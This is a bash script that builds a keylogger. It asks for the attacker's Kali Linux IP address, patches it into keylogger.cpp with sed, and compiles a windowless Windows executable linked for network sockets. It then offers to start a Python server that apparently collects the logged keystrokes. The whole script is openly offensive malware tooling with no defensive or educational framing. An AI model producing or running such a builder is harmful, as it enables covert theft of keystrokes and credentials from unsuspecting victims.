#!/bin/bash

# Download the necessary files from the GitHub repository
#echo "Downloading files from GitHub repository..."
#git clone https://github.com/yourusername/yourrepository.git
#cd yourrepository

# Prompt the user for the LHOST IP address
echo "Enter the LHOST IP address (your Kali Linux IP address):"
read LHOST

# Update the C++ code with the IP address
echo "Updating C++ code with the provided LHOST IP address..."
sed -i "s/REPLACE_WITH_LHOST/$LHOST/" keylogger.cpp

# Compile the C++ code to an executable file
echo "Compiling the C++ code..."
clang++ keylogger.cpp -o keylogger.exe -lws2_32 -mwindows

echo "Compilation completed. The keylogger executable is keylogger.exe"

# Ask if the user wants to run the Python server
echo "Do you want to run the Python server now? (y/n)"
read RUN_SERVER

if [ "$RUN_SERVER" = "y" ] || [ "$RUN_SERVER" = "yes" ]; then
    echo "Running the Python server..."
    python3 server.py
else
    echo "You chose not to run the server now. You can run it later using the command: python3 server.py"
fi
